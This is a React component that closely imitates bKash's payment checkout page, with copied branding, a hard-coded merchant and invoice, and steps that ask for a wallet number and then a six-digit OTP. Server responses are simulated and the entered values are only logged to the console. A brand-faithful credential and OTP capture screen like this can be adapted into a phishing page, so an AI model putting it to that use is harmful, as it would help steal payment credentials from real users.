/** @format */

import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import "./BkashPayment.css"; // We'll create this CSS file

const TRANSACTION_AMOUNT = 885.0; // From your HTML
const MERCHANT_NAME = "SOFTWARE SHOP LTD-5-RM7122";
const INVOICE_NO = "BGT600520250615144535"; // Example invoice

const OTP_TIMER_SECONDS = 120; // 2 minutes for OTP expiry

const BkashPayment = () => {
 const navigate = useNavigate();

 // State for managing the payment flow step
 const [step, setStep] = useState("inputPhoneNumber"); // 'inputPhoneNumber' or 'verifyOtp'

 // State for phone number input
 const [phoneNumber, setPhoneNumber] = useState("");
 const [phoneNumberError, setPhoneNumberError] = useState("");
 const [isPhoneNumberConfirmDisabled, setIsPhoneNumberConfirmDisabled] =
  useState(true);

 // State for OTP verification
 const [otp, setOtp] = useState("");
 const [otpError, setOtpError] = useState("");
 const [otpTimer, setOtpTimer] = useState(OTP_TIMER_SECONDS);
 const [isOtpConfirmDisabled, setIsOtpConfirmDisabled] = useState(true);
 const [isResendDisabled, setIsResendDisabled] = useState(true); // Initially disabled after first OTP sent
 const [resendCooldown, setResendCooldown] = useState(0);

 const otpTimerRef = useRef(null);
 const resendCooldownRef = useRef(null);

 // Effect for Phone Number Input Validation
 useEffect(() => {
  // Basic validation: 11 digits, starts with 01
  const isValid =
   phoneNumber.length === 11 &&
   phoneNumber.startsWith("01") &&
   /^\d+$/.test(phoneNumber);
  setIsPhoneNumberConfirmDisabled(!isValid);
  if (phoneNumber.length > 0 && !isValid) {
   setPhoneNumberError("Please enter a valid 11-digit bKash number.");
  } else {
   setPhoneNumberError("");
  }
 }, [phoneNumber]);

 // Effect for OTP Input Validation
 useEffect(() => {
  const isValid = otp.length === 6 && /^\d+$/.test(otp);
  setIsOtpConfirmDisabled(!isValid || otpTimer === 0); // Also disable if timer expired
  if (otp.length > 0 && !isValid) {
   setOtpError("Please enter a valid 6-digit OTP.");
  } else if (otpTimer === 0) {
   setOtpError("OTP verification time expired");
  } else {
   setOtpError("");
  }
 }, [otp, otpTimer]);

 // Effect for OTP Timer Countdown
 useEffect(() => {
  if (step === "verifyOtp" && otpTimer > 0) {
   otpTimerRef.current = setInterval(() => {
    setOtpTimer((prevTime) => prevTime - 1);
   }, 1000);
  } else if (otpTimer === 0) {
   clearInterval(otpTimerRef.current);
   setIsOtpConfirmDisabled(true); // Disable confirm button when time expires
   setOtpError("OTP verification time expired");
   setIsResendDisabled(false); // Enable resend button
  }
  return () => clearInterval(otpTimerRef.current);
 }, [step, otpTimer]);

 // Effect for Resend Cooldown Timer
 useEffect(() => {
  if (resendCooldown > 0) {
   resendCooldownRef.current = setInterval(() => {
    setResendCooldown((prev) => prev - 1);
   }, 1000);
  } else {
   clearInterval(resendCooldownRef.current);
   if (step === "verifyOtp" && otpTimer === 0) {
    // Only enable resend if OTP is expired
    setIsResendDisabled(false);
   }
  }
  return () => clearInterval(resendCooldownRef.current);
 }, [resendCooldown, step, otpTimer]);

 const formatTime = (seconds) => {
  const minutes = Math.floor(seconds / 60);
  const remainingSeconds = seconds % 60;
  return `${minutes.toString().padStart(2, "0")}:${remainingSeconds
   .toString()
   .padStart(2, "0")}`;
 };

 // Handlers

 const handlePhoneNumberConfirm = async () => {
  if (isPhoneNumberConfirmDisabled) return;

  // Simulate API call to send OTP
  console.log(`Sending OTP to ${phoneNumber}...`);
  setIsPhoneNumberConfirmDisabled(true); // Disable button during API call
  setPhoneNumberError(""); // Clear previous errors

  try {
   // Replace with actual API call to your backend
   // const response = await api.sendOtp(phoneNumber);
   await new Promise((resolve) => setTimeout(resolve, 2000)); // Simulate network delay

   // Simulate server-side validation:
   if (phoneNumber === "01812345678") {
    // Example of a number that is not registered
    setPhoneNumberError(
     "This bKash account is not registered. Please try again.",
    );
    setIsPhoneNumberConfirmDisabled(false); // Re-enable button
    return;
   }
   if (phoneNumber === "01999999999") {
    // Example of a blocked account
    setPhoneNumberError(
     "Your bKash account is currently blocked. Please contact customer service.",
    );
    setIsPhoneNumberConfirmDisabled(false);
    return;
   }

   // If OTP sent successfully:
   setStep("verifyOtp");
   setOtpTimer(OTP_TIMER_SECONDS); // Reset timer for new OTP
   setOtp(""); // Clear previous OTP input
   setIsResendDisabled(true); // Disable resend initially
   setResendCooldown(0); // Ensure cooldown is off initially

   console.log("OTP sent successfully. Proceeding to verification.");
  } catch (error) {
   console.error("Error sending OTP:", error);
   setPhoneNumberError("Failed to send OTP. Please try again later.");
   setIsPhoneNumberConfirmDisabled(false); // Re-enable button on error
  }
 };

 const handleOtpConfirm = async () => {
  if (isOtpConfirmDisabled) return;

  console.log(`Verifying OTP: ${otp} for ${phoneNumber}...`);
  setIsOtpConfirmDisabled(true); // Disable button during API call
  setOtpError(""); // Clear previous errors

  try {
   // Replace with actual API call to your backend
   // const response = await api.verifyOtp(phoneNumber, otp);
   await new Promise((resolve) => setTimeout(resolve, 2000)); // Simulate network delay

   // Simulate server-side responses for OTP verification and balance check
   if (otp === "123456") {
    // Correct OTP
    // Simulate balance check after successful OTP verification
    if (phoneNumber === "01712345678" && TRANSACTION_AMOUNT > 500) {
     // Example: insufficient balance for this number
     setOtpError(
      "Insufficient balance. Your bKash account does not have enough funds for this transaction.",
     );
     setIsOtpConfirmDisabled(false); // Re-enable button
     // Keep user on OTP page to allow them to try again if they top up
     return;
    }
    // Successful payment
    console.log("Payment successful!");
    alert("Payment successful!"); // For demonstration
    navigate("/payment-success", {
     state: { amount: TRANSACTION_AMOUNT, invoice: INVOICE_NO },
    }); // Redirect to success page
   } else if (otp === "000000") {
    // Too many incorrect attempts
    setOtpError(
     "Too many incorrect attempts. Your bKash account may be temporarily locked. Please try again later.",
    );
    setIsOtpConfirmDisabled(true); // Keep disabled if account locked
    clearInterval(otpTimerRef.current); // Stop timer
    setIsResendDisabled(true); // Also disable resend
   } else {
    // Incorrect OTP
    setOtpError("Invalid verification code. Please try again.");
    setIsOtpConfirmDisabled(false); // Re-enable for another attempt
    setOtp(""); // Clear OTP input
   }
  } catch (error) {
   console.error("Error verifying OTP:", error);
   setOtpError("Failed to verify OTP. Please try again later.");
   setIsOtpConfirmDisabled(false); // Re-enable button on error
  }
 };

 const handleResendOtp = async () => {
  if (isResendDisabled || resendCooldown > 0) return;

  console.log("Resending OTP...");
  setIsResendDisabled(true); // Disable resend button immediately
  setResendCooldown(30); // Start 30-second cooldown

  try {
   // Replace with actual API call to resend OTP
   // const response = await api.resendOtp(phoneNumber);
   await new Promise((resolve) => setTimeout(resolve, 1500)); // Simulate network delay

   setOtpTimer(OTP_TIMER_SECONDS); // Reset timer
   setOtp(""); // Clear current OTP
   setOtpError(""); // Clear any OTP errors
   setIsOtpConfirmDisabled(false); // Re-enable confirm button
   console.log("New OTP sent!");
  } catch (error) {
   console.error("Error resending OTP:", error);
   setOtpError("Failed to resend OTP. Please try again.");
   setIsResendDisabled(false); // Re-enable if resend failed (no cooldown)
   setResendCooldown(0); // Reset cooldown
  }
 };

 const handleCancel = () => {
  clearInterval(otpTimerRef.current); // Clear any running timers
  clearInterval(resendCooldownRef.current);
  alert("Payment cancelled!"); // For demonstration
  navigate("/payment-cancelled"); // Redirect to a cancellation page
 };

 // Conditional Rendering
 const renderHeader = () => (
  <header className="header d-flex flex-center-x">
   {/* SVG bKash Logo */}
   <svg
    width="140"
    height="65"
    viewBox="0 0 140 65"
    fill="none"
    role="img"
    xmlns="http://www.w3.org/2000/svg"
    className="header__logo"
   >
    <title id="headerLogo">Bkash Logo</title>
    <g clipPath="url(#clip0_2750_4283)">
     <path
      d="M96.7875 31.0528L100.757 48.8874L126.715 35.7465L96.7875 31.0528Z"
      fill="#CF1E53"
     ></path>
     <path
      d="M104.17 4.40625L96.7931 31.0583L126.717 35.7483L104.17 4.40625Z"
      fill="#DD156E"
     ></path>
     <path
      d="M72.4613 0.500641L103.413 4.20098L96.0947 30.6935L72.4613 0.500641Z"
      fill="#CF1E53"
     ></path>
     <path
      d="M72.2139 5.71484H75.6613L85.3346 18.0786L72.2139 5.71484Z"
      fill="#9E1C3E"
     ></path>
     <path
      d="M127.543 35.5723L118.544 23.1242L133.094 20.518L127.543 35.5723Z"
      fill="#CF1E53"
     ></path>
     <path
      d="M126.033 39.2287L126.96 36.4521L104.25 47.9747L126.033 39.2287Z"
      fill="#DD156E"
     ></path>
     <path
      d="M96.1515 31.7584L100.889 53.0642L86.8228 64.5006L96.1515 31.7584Z"
      fill="#9E1C3E"
     ></path>
     <path
      d="M131.676 26.8466L139.936 26.7091L133.967 20.6317L131.676 26.8466Z"
      fill="#DD156E"
     ></path>
     <path
      d="M2.75592 25.6223H21.265V28.3256H2.52316V49.9632C2.52316 49.9632 1.71491 49.8404 1.22007 49.8404C0.75638 49.8404 0.0690952 49.9632 0.0690952 49.9632L0.0727607 28.3256V25.6223L0.0654297 25.5361C0.0690952 19.1948 2.46635 15.5934 8.59876 15.1554C14.1245 14.7614 18.2867 17.9998 21.2686 19.5778V22.7284L20.8691 22.7925C20.3376 21.5939 13.8185 16.1158 9.56646 16.5355C5.19533 16.9698 2.49567 20.0745 2.54332 24.1396C2.54332 24.1396 2.57448 25.2356 2.72843 25.5636L2.75959 25.6223H2.75592Z"
      fill="#DD156E"
     ></path>
     <path
      d="M40.8425 30.0758C45.4483 29.9439 47.8015 31.5659 47.9463 35.0261C48.0251 36.9688 47.2022 38.7704 45.9248 40.3906L43.6393 40.4548L43.6247 40.0919C44.5136 39.8371 46.3756 38.4974 46.2767 36.0946C46.174 33.6241 44.3853 31.7217 41.3685 31.806C41.3685 31.806 40.9159 31.8096 40.6959 31.9031L40.8425 30.0777V30.0758Z"
      fill="#211E1F"
     ></path>
     <path
      d="M18.8091 27.7648H21.265V49.9668L18.8091 49.1439V27.7648Z"
      fill="#DD156E"
     ></path>
     <path
      d="M66.0393 30.8878C65.0807 27.5742 62.2583 25.6259 60.2258 25.6259H54.8044V28.3274H58.3417C59.8995 28.3274 61.538 28.1625 62.9896 29.4949C63.6127 30.0667 63.8619 30.7064 64.0434 31.5403C64.4942 33.6296 63.5724 36.146 61.1421 36.2083C60.4145 36.2266 59.555 36.157 58.8567 35.9426L58.6661 36.1332C59.2544 36.9121 59.6997 37.7845 60.1671 38.6312C61.5747 38.3765 63.0354 37.5187 64.0067 36.5474C65.5737 34.9785 66.3142 33.0981 66.0374 30.8896"
      fill="#211E1F"
     ></path>
     <path
      d="M70.0237 25.9431C68.4805 26.1593 65.9549 27.5742 65.0935 30.8879C64.8443 33.0982 65.5114 34.9767 66.9226 36.5456C67.7968 37.5169 69.1128 38.3765 70.3774 38.6294C70.7971 37.7827 71.1985 36.9121 71.73 36.1314L71.5577 35.9426C70.929 36.157 70.1574 36.2267 69.5013 36.2065C66.9831 36.1369 66.5231 33.5509 66.9171 31.5403C67.2507 29.823 68.7755 28.1332 70.2857 28.0104C71.9627 27.8711 74.0136 29.2842 74.4259 31.018C74.6459 31.9435 74.7284 32.957 74.7284 33.9082V49.9614C74.7284 49.9614 75.4908 49.8459 75.9306 49.8459C76.4017 49.8459 77.1531 49.9614 77.1531 49.9614V25.6682H74.5414V28.3678C74.5414 28.2982 74.6807 28.19 74.5579 27.9921C73.7277 26.6487 71.3432 25.7598 70.0255 25.9467"
      fill="#211E1F"
     ></path>
     <path
      d="M54.1776 25.6223V49.9632C54.1776 49.9632 53.3914 49.8404 52.9295 49.8404C52.4328 49.8404 51.7272 49.9632 51.7272 49.9632V28.3275H21.9082V25.6242H54.1776V25.6223Z"
      fill="#211E1F"
     ></path>
     <path
      d="M21.265 49.9668H20.8453C11.3772 49.9668 5.98523 44.7288 5.98523 39.5073C5.98523 35.149 9.99531 30.0612 19.2691 30.0612L20.9094 31.3332C14.4672 31.3735 9.1834 35.422 9.1834 39.6649C9.1834 43.3157 13.8313 49.1659 21.2631 49.1659V49.9668H21.265Z"
      fill="#DD156E"
     ></path>
     <path
      d="M38.6615 27.7648H41.1174V49.9668L38.6615 49.1439V27.7648Z"
      fill="#211E1F"
     ></path>
     <path
      d="M41.1174 49.9668H40.6977C31.2296 49.9668 25.8358 44.7288 25.8358 39.5073C25.8358 35.149 29.8477 30.0612 39.1197 30.0612L40.7618 31.3332C34.3178 31.3735 29.0358 35.422 29.0358 39.6649C29.0358 43.3157 33.6855 49.1659 41.1174 49.1659V49.9668Z"
      fill="#211E1F"
     ></path>
    </g>
    <defs>
     <clipPath id="clip0_2750_4283">
      <rect
       width="139.873"
       height="64"
       fill="white"
       transform="translate(0.0637207 0.5)"
      ></rect>
     </clipPath>
    </defs>
   </svg>
  </header>
 );

 const renderMerchantInfo = () => (
  <>
   <span className="hr"></span>
   <section className="merchant d-flex">
    <img
     src="https://securepay.sslcommerz.com/public/image/bkash/sslcommerz.png"
     alt="Merchant Logo"
     className="merchant__logo"
    />
    <div className="merchant__details">
     <h4 className="merchant__details__name">{MERCHANT_NAME}</h4>
     <p className="merchant__details__invoice">Inv No: {INVOICE_NO}</p>
    </div>
    <div className="merchant__amount">
     <p>৳{TRANSACTION_AMOUNT.toFixed(2)}</p>
    </div>
   </section>
  </>
 );

 const renderFooter = () => (
  <footer className="footer d-flex flex-center-y">
   <div className="footer__helpline d-flex flex-center-x">
    <a href="tel:16247">
     <svg
      width="19"
      height="18"
      viewBox="0 0 19 18"
      fill="none"
      role="img"
      xmlns="http://www.w3.org/2000/svg"
      className="footer__helpline-icon"
     >
      <title id="phoneIcon">Phone Icon for HelpLine Number</title>
      <path
       d="M9.5 18C14.4706 18 18.5 13.9706 18.5 9C18.5 4.02944 14.4706 0 9.5 0C4.52944 0 0.5 4.02944 0.5 9C0.5 13.9706 4.52944 18 9.5 18Z"
       fill="#E2136E"
      ></path>
      <path
       d="M6.86616 8.4592C7.60054 9.86757 8.74925 11.0168 10.1573 11.7518L11.2546 10.6552C11.3128 10.5827 11.3947 10.5329 11.4859 10.5146C11.5771 10.4963 11.6718 10.5107 11.7535 10.5551C12.3297 10.7594 12.9372 10.8608 13.5485 10.8546C13.6151 10.8505 13.6818 10.8606 13.7442 10.8843C13.8066 10.9079 13.8632 10.9445 13.9104 10.9917C13.9576 11.0388 13.9942 11.0955 14.0178 11.1579C14.0415 11.2203 14.0515 11.287 14.0474 11.3536V13.0492C14.0515 13.1158 14.0415 13.1825 14.0178 13.2449C13.9942 13.3073 13.9576 13.364 13.9104 13.4111C13.8632 13.4583 13.8066 13.4949 13.7442 13.5186C13.6818 13.5422 13.6151 13.5523 13.5485 13.5482C12.4349 13.5491 11.3321 13.3305 10.3031 12.9047C9.2741 12.479 8.33916 11.8545 7.55178 11.0671C6.76439 10.2796 6.14001 9.34464 5.71436 8.31562C5.28872 7.2866 5.07016 6.18374 5.0712 5.07016C5.0671 5.00357 5.07719 4.93687 5.10082 4.87447C5.12444 4.81207 5.16105 4.75541 5.20823 4.70823C5.25541 4.66105 5.31207 4.62444 5.37447 4.60082C5.43687 4.57719 5.50357 4.5671 5.57016 4.5712H7.31544C7.38204 4.5671 7.44874 4.57719 7.51114 4.60082C7.57354 4.62444 7.6302 4.66105 7.67738 4.70823C7.72456 4.75541 7.76117 4.81207 7.78479 4.87447C7.80842 4.93687 7.81851 5.00357 7.8144 5.07016C7.81656 5.68074 7.91771 6.28693 8.11392 6.86512C8.13387 6.95061 8.13526 7.03939 8.118 7.12546C8.10073 7.21153 8.06522 7.2929 8.01384 7.36408L6.86616 8.4592Z"
       fill="white"
      ></path>
     </svg>
    </a>
    <a href="tel:16247" target="_parent" className="footer__helpline-number">
     {" "}
     16247{" "}
    </a>
   </div>
   <div className="footer__copyright"> © 2025 bKash, All Rights Reserved </div>
  </footer>
 );

 return (
  <div className="app" data-v-app="">
   <section className="container">
    {renderHeader()}
    {renderMerchantInfo()}

    {step === "inputPhoneNumber" && (
     <section className="form d-flex flex-center-y text-center card bg-cerise">
      <label htmlFor="WALLET" className="form__label">
       {" "}
       Your bKash Account Number{" "}
      </label>
      <input
       id="WALLET"
       required
       className="input-numeric form-input"
       pattern="[0-9]*"
       inputMode="numeric"
       enterKeyHint="go"
       placeholder="e.g 01XXXXXXXXX"
       maxLength="11"
       type="text"
       autoComplete="off"
       value={phoneNumber}
       onChange={(e) => setPhoneNumber(e.target.value)}
      />
      {phoneNumberError && (
       <p className="form__error-message">{phoneNumberError}</p>
      )}
      <p className="form__info">
       Confirm and proceed,{" "}
       <a
        className="underline"
        href="https://www.bkash.com/tokenized_checkout"
        target="_blank"
        rel="noopener noreferrer"
       >
        terms &amp; conditions{" "}
       </a>
      </p>
     </section>
    )}

    {step === "verifyOtp" && (
     <section className="form d-flex flex-center-y text-center card bg-cerise">
      <label htmlFor="OTP" className="form__label">
       Enter verification code sent to{" "}
       <span>
        {phoneNumber.replace(/(\d{3})(\d{4})(\d{4})/, "$1 ** *** $3")}
       </span>
      </label>
      <input
       id="OTP"
       required
       className="input-numeric form-input"
       pattern="[0-9]*"
       inputMode="numeric"
       enterKeyHint="go"
       placeholder="Enter 6 digit code"
       maxLength="6"
       type="text"
       autoComplete="off"
       value={otp}
       onChange={(e) => setOtp(e.target.value)}
       disabled={otpTimer === 0} // Disable input when timer expires
      />

      {otpError && (
       <p className="mb-8">
        <svg
         width="21"
         height="20"
         viewBox="0 0 21 20"
         fill="none"
         role="img"
         xmlns="http://www.w3.org/2000/svg"
         className="form__error-icon icon-sm mr-8"
        >
         <title id="errorIcon">Error Icon</title>
         <g clipPath="url(#clip0_506_3042)">
          <path
           d="M17.375 19.3737H3.625C1.90188 19.3737 0.5 17.9719 0.5 16.2487C0.5 15.714 0.637578 15.1861 0.897969 14.7219L7.77129 2.22482C7.7725 2.22264 7.77371 2.22049 7.77492 2.2183C8.96871 0.0959181 12.0308 0.0951368 13.2251 2.2183C13.2263 2.22045 13.2275 2.22264 13.2287 2.22482L20.1021 14.7218C20.3624 15.1861 20.5 15.714 20.5 16.2487C20.5 17.9719 19.0981 19.3737 17.375 19.3737ZM9.13844 2.98139L2.26539 15.4778C2.26418 15.48 2.26297 15.4822 2.26176 15.4844C2.13141 15.7161 2.0625 15.9804 2.0625 16.2487C2.0625 17.1103 2.76344 17.8112 3.625 17.8112H17.375C18.2366 17.8112 18.9375 17.1103 18.9375 16.2487C18.9375 15.9804 18.8686 15.7161 18.7382 15.4844C18.737 15.4822 18.7358 15.48 18.7346 15.4778L11.8617 2.98158C11.2636 1.92346 9.73719 1.92225 9.13844 2.98139Z"
           fill="white"
          ></path>
          <path
           d="M10.5 12.3425C10.0685 12.3425 9.71875 11.9928 9.71875 11.5613V6.87378C9.71875 6.44229 10.0685 6.09253 10.5 6.09253C10.9315 6.09253 11.2812 6.44229 11.2812 6.87378V11.5613C11.2812 11.9928 10.9315 12.3425 10.5 12.3425Z"
           fill="white"
          ></path>
          <path
           d="M10.5 15.4675C10.9315 15.4675 11.2812 15.1178 11.2812 14.6863C11.2812 14.2548 10.9315 13.905 10.5 13.905C10.0685 13.905 9.71875 14.2548 9.71875 14.6863C9.71875 15.1178 10.0685 15.4675 10.5 15.4675Z"
           fill="white"
          ></path>
         </g>
         <defs>
          <clipPath id="clip0_506_3042">
           <rect
            width="20"
            height="20"
            fill="white"
            transform="translate(0.5)"
           ></rect>
          </clipPath>
         </defs>
        </svg>
        <span className="form__error-text">{otpError}</span>
       </p>
      )}
      <p className="form__info">
       {otpTimer > 0 ? (
        <span>Time remaining: {formatTime(otpTimer)}</span>
       ) : (
        <a
         className={`underline ${isResendDisabled ? "disabled-link" : ""}`}
         tabIndex="0"
         onClick={handleResendOtp}
        >
         Resend Code {resendCooldown > 0 && `(${resendCooldown}s)`}
        </a>
       )}
      </p>
     </section>
    )}

    <div className="btn-group d-flex flex-center-x">
     <button
      type="button"
      className="btn btn-group__btn-close btn-lg"
      onClick={handleCancel}
     >
      {" "}
      Cancel{" "}
     </button>
     <button
      type="button"
      className={`btn btn-group__btn-confirm btn-lg btn-active text-center ${
       step === "inputPhoneNumber"
        ? isPhoneNumberConfirmDisabled
          ? "disabled"
          : ""
        : isOtpConfirmDisabled
        ? "disabled"
        : ""
      }`}
      onClick={
       step === "inputPhoneNumber" ? handlePhoneNumberConfirm : handleOtpConfirm
      }
      disabled={
       step === "inputPhoneNumber"
        ? isPhoneNumberConfirmDisabled
        : isOtpConfirmDisabled
      }
     >
      Confirm
     </button>
    </div>

    {renderFooter()}
   </section>
  </div>
 );
};

export default BkashPayment;
